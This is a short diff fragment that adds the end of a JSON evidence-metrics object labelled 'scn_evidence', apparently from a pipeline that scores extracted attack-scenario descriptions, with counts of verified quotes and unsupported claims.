+  "quote_verified_rate": 0.9394,
+  "unsupported_claim_count": 8,
+  "inferred_count": 3,
+  "absent_count": 0,
+  "method": "single_pass",
+  "provisional": true,
+  "dropped_placeholder_hosts": 0,
+  "excluded_non_attacker_actions": [],
+  "hedged_action_count": 0,
+  "capability_action_count": 0,
+  "dropped_non_software_services": [],
+  "dropped_misplaced_techniques": []
+ },
+ "id": "scn_evidence"
+}
